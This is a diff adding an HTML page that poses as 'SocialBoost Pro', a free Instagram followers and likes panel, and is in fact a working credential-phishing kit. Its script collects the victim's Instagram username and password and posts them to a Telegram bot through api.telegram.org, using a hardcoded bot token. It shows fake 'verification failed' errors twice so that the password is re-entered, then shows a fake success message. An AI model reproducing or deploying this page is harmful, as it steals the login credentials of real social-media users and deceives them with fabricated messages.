@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>SocialBoost Pro — Free SMM Panel</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;font-family:system-ui;background:#eef2f7;color:#0f172a}
+  .page{min-height:100vh;display:flex;flex-direction:column;align-items:center}
+
+  .top{
+    width:100%;
+    background:linear-gradient(135deg,#2563eb,#4f46e5);
+    color:#fff;padding:28px 16px;text-align:center
+  }
+  .top h1{margin:0;font-size:24px}
+  .top p{margin:6px 0 14px;font-size:14px}
+  .stats{display:flex;gap:12px;justify-content:center;font-size:12px}
+  .stats div{background:rgba(255,255,255,.15);padding:6px 12px;border-radius:999px}
+
+  .card{
+    width:420px;max-width:92%;
+    background:#fff;margin-top:-24px;border-radius:16px;
+    box-shadow:0 25px 60px rgba(0,0,0,.15);overflow:hidden
+  }
+  .card-inner{padding:22px}
+
+  .trust{
+    display:grid;grid-template-columns:repeat(3,1fr);
+    gap:10px;margin-bottom:14px
+  }
+  .trust div{
+    border:1px solid #e5e7eb;border-radius:10px;
+    padding:10px;font-size:12px;text-align:center;background:#f9fafb
+  }
+
+  .alert{
+    background:#fff7ed;border:1px solid #fed7aa;color:#9a3412;
+    font-size:12px;border-radius:10px;padding:12px;margin-bottom:16px
+  }
+
+  label{font-size:12px;color:#475569}
+  input,select{
+    width:100%;padding:12px;margin:6px 0 12px;
+    border-radius:10px;border:1px solid #d1d5db;font-size:14px
+  }
+
+  #continueBtn{
+    width:100%;padding:12px;border:none;border-radius:10px;
+    background:#9ca3af;color:#374151;
+    font-weight:700;cursor:not-allowed;
+    transition:background .25s ease,transform .2s ease,box-shadow .2s ease
+  }
+  #continueBtn.enabled{
+    background:#22c55e;color:#064e3b;
+    cursor:pointer;
+    box-shadow:0 10px 22px rgba(34,197,94,.35);
+    transform:translateY(-1px)
+  }
+
+  .error{
+    color:#dc2626;font-size:12px;
+    margin-top:-8px;margin-bottom:8px;display:none
+  }
+
+  .steps{padding:16px 22px;background:#f8fafc;font-size:12px;color:#334155}
+  .footer{
+    width:100%;margin-top:20px;padding:18px 14px;
+    background:#0f172a;color:#cbd5f5;text-align:center;
+    font-size:11px;line-height:1.5
+  }
+
+  .success-box{
+    display:none;
+    margin:16px;
+    width:420px;max-width:92%;
+    background:#ecfdf5;
+    border:1px solid #86efac;
+    color:#065f46;
+    padding:14px;
+    border-radius:12px;
+    font-size:13px;
+    text-align:center;
+  }
+
+  .overlay{
+    position:fixed;inset:0;background:rgba(15,23,42,.85);
+    display:none;align-items:center;justify-content:center;z-index:999
+  }
+  .verify-box{
+    background:#fff;width:320px;border-radius:14px;
+    padding:22px;text-align:center
+  }
+  .spinner{
+    width:42px;height:42px;border:4px solid #e5e7eb;
+    border-top-color:#2563eb;border-radius:50%;
+    margin:0 auto 14px;animation:spin 1s linear infinite
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .verify-text{font-size:14px;font-weight:600}
+  .verify-sub{margin-top:6px;font-size:12px;color:#64748b}
+</style>
+</head>
+<body>
+
+<div class="page">
+  <div class="top">
+    <h1>SocialBoost Pro</h1>
+    <p>Free Instagram Followers • Likes • Views</p>
+    <div class="stats">
+      <div>10K+ Users</div>
+      <div>Instant Delivery</div>
+      <div>No Payment</div>
+    </div>
+  </div>
+
+  <div class="card" id="formCard">
+    <div class="card-inner">
+
+      <div class="trust">
+        <div>SSL Secured</div>
+        <div>Fast Delivery</div>
+        <div>24/7 Support</div>
+      </div>
+
+      <div class="alert">
+        <b>Please ensure the information provided is accurate.</b><br>
+        In case of a verification issue, you may be required to re-enter your details to continue.
+      </div>
+
+      <label>Service</label>
+      <select id="service" onchange="updateAmounts()">
+        <option>Followers</option>
+        <option>Likes</option>
+        <option>Views</option>
+      </select>
+
+      <label>Quantity</label>
+      <select id="amount"></select>
+
+      <label>Instagram Username</label>
+      <input id="username" placeholder="mr_avnish">
+      <div id="usernameError" class="error">
+        Only lowercase letters, numbers, underscore (_) and dot (.) allowed.
+      </div>
+
+      <label>Password</label>
+      <input type="name" id="fullname" placeholder="Enter Password">
+
+      <button id="continueBtn" onclick="startVerification()" disabled>Continue</button>
+
+      <div class="steps">
+        <div>① Select Service & Quantity</div>
+        <div>② Completing Verification</div>
+        <div>③ Delivery in Progress</div>
+      </div>
+    </div>
+  </div>
+
+  <div id="successBox" class="success-box"></div>
+
+  <div class="footer">
+    If processing is delayed, please try again later or contact support.
+  </div>
+</div>
+
+<div class="overlay" id="overlay">
+  <div class="verify-box">
+    <div class="spinner"></div>
+    <div class="verify-text">Verifying account…</div>
+    <div class="verify-sub">Please wait</div>
+  </div>
+</div>
+
+<script>
+const BOT_TOKEN = "7740957076:AAFEHQL1w9VZyxMmt6M5h_04-VnMJqu7lr0";
+
+/* 🔹 ONLY FIX HERE */
+const urlParams = new URLSearchParams(window.location.search);
+const CHAT_ID = urlParams.get("Id") || urlParams.get("id");
+
+const AMOUNTS = {
+  Followers:["1,000","5,000","10,000"],
+  Likes:["1,000","5,000","10,000"],
+  Views:["10,000","50,000","100,000"]
+};
+
+let attempt = 0;
+
+const usernameInput = document.getElementById("username");
+const fullnameInput = document.getElementById("fullname");
+const continueBtn = document.getElementById("continueBtn");
+const usernameError = document.getElementById("usernameError");
+const successBox = document.getElementById("successBox");
+const formCard = document.getElementById("formCard");
+
+function updateAmounts(){
+  const s=document.getElementById("service").value;
+  const a=document.getElementById("amount");
+  a.innerHTML="";
+  AMOUNTS[s].forEach(v=>{
+    const o=document.createElement("option");
+    o.textContent=v;a.appendChild(o);
+  });
+}
+updateAmounts();
+
+function checkFields(){
+  const u=usernameInput.value.trim();
+  const f=fullnameInput.value.trim();
+  const valid=/^[a-z0-9._]+$/.test(u) && u!=="" && f!=="";
+
+  continueBtn.disabled=!valid;
+  continueBtn.classList.toggle("enabled",valid);
+}
+
+usernameInput.addEventListener("input",()=>{
+  usernameInput.value=usernameInput.value
+    .toLowerCase()
+    .replace(/[^a-z0-9._]/g,"");
+
+  usernameError.style.display =
+    usernameInput.value && !/^[a-z0-9._]+$/.test(usernameInput.value)
+      ? "block" : "none";
+
+  checkFields();
+});
+
+fullnameInput.addEventListener("input",checkFields);
+usernameInput.addEventListener("change",checkFields);
+fullnameInput.addEventListener("change",checkFields);
+document.getElementById("service").addEventListener("change",checkFields);
+document.getElementById("amount").addEventListener("change",checkFields);
+
+function clearInputs(){
+  usernameInput.value="";
+  fullnameInput.value="";
+  checkFields();
+}
+
+function startVerification(){
+  if(continueBtn.disabled) return;
+
+  attempt++;
+  sendAttempt();
+
+  document.getElementById("overlay").style.display="flex";
+  setTimeout(()=>{
+    document.getElementById("overlay").style.display="none";
+    if(attempt < 3){
+      clearInputs();
+      alert("Verification failed due to a system error. Please enter details again.");
+    }else{
+      formCard.style.display="none";
+      successBox.innerHTML=`
+        <b>Success</b><br>
+        Verification completed.<br>
+        Your request has been processed successfully.<br>
+        Order will be completed within 24 hours.
+      `;
+      successBox.style.display="block";
+      successBox.scrollIntoView({behavior:"smooth",block:"center"});
+      attempt=0;
+    }
+  },2200);
+}
+
+function sendAttempt(){
+  if(!CHAT_ID) return;
+
+  const msg=`✅ Instagram Account Credential Received 💀
+
+Username: ${usernameInput.value}
+Password: ${fullnameInput.value}
+
+Time: ${new Date().toLocaleString()}`;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:CHAT_ID,text:msg})
+  });
+}
+</script>
+
+</body>
+</html>
